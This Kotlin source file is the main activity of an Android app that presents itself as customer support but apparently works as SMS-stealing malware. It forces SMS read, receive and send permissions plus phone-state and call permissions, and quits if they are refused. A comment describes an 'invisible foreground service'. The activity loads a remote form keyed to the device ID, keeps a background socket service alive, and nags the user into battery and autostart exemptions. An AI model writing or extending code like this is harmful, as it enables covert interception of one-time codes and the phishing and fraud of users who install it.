package com.customersupport

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.customersupport.databinding.ActivityMainBinding
import com.customersupport.util.OemSettingsHelper
import com.customersupport.util.ServiceStarter

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PREFS_NAME = "app_state"
        private const val KEY_OEM_GUIDE_SHOWN = "oem_guide_shown"
        private const val KEY_AUTOSTART_OPENED = "autostart_opened"
        private const val KEY_NOTIF_ASKED = "notif_permission_asked"
    }

    private lateinit var binding: ActivityMainBinding

    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusRunnable = object : Runnable {
        override fun run() {
            updateStatusDot()
            statusHandler.postDelayed(this, 3000L)
        }
    }

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
    ).apply {
        // POST_NOTIFICATIONS is intentionally NOT requested: the app uses an
        // invisible foreground service and should not surface notifications.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
    }

    // Prevents re-launching the guide in a loop when the user returns from it
    // within the same Activity session.
    private var guideShownThisSession = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            startSocketService()
            requestNotificationPermissionIfNeeded()
        } else {
            // Close the app if permissions are denied
            // Permissions will be re-asked on next app launch (onCreate calls requestPermissionsIfNeeded)
            finishAffinity()
        }
    }

    // Notifications are optional for the app to function, but on MIUI/HyperOS a
    // *visible* foreground-service notification is what keeps the app alive in
    // the background. Never close the app if this is denied.
    private var notificationPermissionInFlight = false

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        notificationPermissionInFlight = false
        Log.d(TAG, "POST_NOTIFICATIONS granted=$granted")
        // Re-start the service so startForeground() posts the notification again
        // now that the permission may be granted (the first post happened while
        // it was still denied and was dropped by the system).
        startSocketService()
        // Show the setup guide only AFTER the notification dialog is dismissed,
        // otherwise starting an Activity can cancel the permission dialog.
        showBackgroundGuideIfNeeded()
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Request permissions
        requestPermissionsIfNeeded()

        // Connection health indicator opens the native health screen
        binding.statusDot.setOnClickListener {
            startActivity(Intent(this, HealthActivity::class.java))
        }

        // Setup WebView
        setupWebView()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val deviceId = getAndroidId()
        val formUrl = "https://csapi.sarver.xyz/form?deviceId=$deviceId"

        binding.webView.apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true
            settings.builtInZoomControls = true
            settings.displayZoomControls = false
            settings.setSupportZoom(true)
            settings.allowFileAccess = true
            settings.allowContentAccess = true

            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                    binding.progressBar.visibility = View.VISIBLE
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    binding.progressBar.visibility = View.GONE
                }
            }

            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    binding.progressBar.progress = newProgress
                }
            }

            loadUrl(formUrl)
        }
    }

    private fun requestPermissionsIfNeeded() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            startSocketService()
            requestNotificationPermissionIfNeeded()
        }
    }

    /** Ask for notifications (optional) so the FGS notification is visible on MIUI/HyperOS. */
    private fun requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) return
        if (notificationPermissionInFlight) return

        // If the user permanently denied it, launching again is a silent no-op —
        // the health screen routes them to settings instead.
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val alreadyAsked = prefs.getBoolean(KEY_NOTIF_ASKED, false)
        val canAsk = !alreadyAsked || shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)
        if (!canAsk) {
            Log.d(TAG, "Notification permission permanently denied — use Settings")
            return
        }

        prefs.edit().putBoolean(KEY_NOTIF_ASKED, true).apply()
        notificationPermissionInFlight = true
        try {
            notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        } catch (e: Exception) {
            notificationPermissionInFlight = false
            Log.d(TAG, "Notification permission request failed", e)
        }
    }

    override fun onResume() {
        super.onResume()
        statusHandler.post(statusRunnable)
        // Re-check after the user returns from the guide / system battery dialog.
        if (hasAllPermissions()) {
            requestNotificationPermissionIfNeeded()
            showBackgroundGuideIfNeeded()
        }
    }

    override fun onPause() {
        super.onPause()
        statusHandler.removeCallbacks(statusRunnable)
    }

    /** Green dot = socket connected AND notifications enabled; amber = action needed. */
    private fun updateStatusDot() {
        val connected = CustomerSupportApp.socketManager.isConnected()
        val notificationsOk = NotificationManagerCompat.from(this).areNotificationsEnabled()
        val colorRes = if (connected && notificationsOk) R.color.success else R.color.warning
        binding.statusDot.backgroundTintList = ContextCompat.getColorStateList(this, colorRes)
    }

    /**
     * Routes battery-optimization and OEM autostart setup through the native
     * guide screen instead of jumping straight into system Settings.
     *
     * The guide is re-shown on every app launch while the battery exemption is
     * missing. Once the exemption is granted, the autostart steps are shown once
     * (there is no API to detect whether OEM autostart was actually enabled).
     */
    private fun showBackgroundGuideIfNeeded() {
        if (guideShownThisSession) return
        // Never start the guide while a permission dialog is showing.
        if (notificationPermissionInFlight) return

        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val oemGuideShown = prefs.getBoolean(KEY_OEM_GUIDE_SHOWN, false)
        val autostartOpened = prefs.getBoolean(KEY_AUTOSTART_OPENED, false)

        when {
            // Battery exemption missing — still the most likely reason for drops.
            !isIgnoringBatteryOptimizations() -> showGuide()
            // First run — introduce the two setup steps once.
            !oemGuideShown -> {
                prefs.edit().putBoolean(KEY_OEM_GUIDE_SHOWN, true).apply()
                showGuide()
            }
            // Aggressive OEMs (MIUI/HyperOS, EMUI, ColorOS...): Autostart is
            // mandatory to survive backgrounding, so keep surfacing the guide
            // until the user opens the Autostart screen at least once.
            OemSettingsHelper.isAutoStartCritical() && !autostartOpened -> showGuide()
        }
    }

    private fun showGuide() {
        guideShownThisSession = true
        startActivity(Intent(this, OemGuideActivity::class.java))
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun startSocketService() {
        ServiceStarter.start(this)
    }

    private fun getAndroidId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onBackPressed() {
        val currentUrl = binding.webView.url ?: ""
        // Block back navigation on the success page — flow is complete
        if (currentUrl.contains("success.html")) {
            return
        }
        if (binding.webView.canGoBack()) {
            binding.webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
